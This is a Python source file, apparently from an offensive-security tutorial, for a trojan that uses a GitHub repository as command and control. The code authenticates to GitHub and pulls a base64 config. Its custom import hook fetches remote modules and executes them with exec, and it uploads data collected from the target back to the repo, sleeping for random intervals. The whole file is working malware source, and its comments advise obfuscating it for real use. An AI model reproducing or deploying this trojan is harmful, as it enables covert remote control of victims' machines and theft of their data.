#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

# Trojan ID variable that uniquely identifies this trojan
trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()

# These four functions represent the core interaction
#between the trojan and GitHub:

# Authenticate the user and retrieve current repo and branch
# for use by other functions. (auth process needs to be obfuscated
# as much as possible in a real world scenario)
def connect_to_github():
    gh = login(username="username", password="password")
    repo = gh.repository("username","chapter7")
    branch = repo.branch("master")

    return gh,repo,branch

# Grab files from the remote repo and read the contents in locally.
# Both for reading configuration options as well as reading module source code.
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

# The get_trojan_config function is responsible for retrieving
#the remote configuration document from therepo so that your
# trojan knows which modules to run.
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config

# Used to push any data that we've collected on the target machine.
def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,100000))
    repo.create_file(remote_path, "My commit message", base64.b64encode(data))

    return

# Now let’s create an import hack to import remote files from our GitHub repo.
# Python allows us to insert our own functionality into how it imports modules,
# such that if a module cannot be found locally, our import class will be called,
# which will allow us to remotely retrieve the library from our repo. This is
# achieved by adding a custom class to the sys.meta_path list.

# Every time the interpreter attempts to load a module that isn’t available, our GitImporter class is used.
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    # Attempt to locate module, and pass the call to our remote file loader.
    # If we can find the file in our repo, we b64 decode the code and
    # store it in our class.
    def find_module(self,fullname,path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                # Returning self indicates the Python interpreter that we found
                # the module and it can then call our load_modulefunction to
                # actually load it.
                return self

        return None

    def load_module(self,name):
        # We use the native impo module to first create a new
        # blank module object. Then we shove the code we retrieved
        # from Github into it.
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        # insert our newly created module into the sys.modules list
        # so that it’s picked up by any future import calls.
        sys.modules[name] = module

        return module

def module_runner(module):
    task_queue.put(1)
    # Call the module's run() function to kick-off its code.
    result = sys.modules[module].run()
    # When it’s done running, we should have the result in a string
    #that we then push to our repo.
    task_queue.get()

    # Store the result in our repo
    store_module_result(result)

    return

# Main trojan loop
# Make sure to add our custom module importer w before we
# begin the main loop of our application.
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        # Grab the config file from the repo
        config = get_trojan_config()

        for task in config:
            # Then kick-off the module in its own thread.
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))
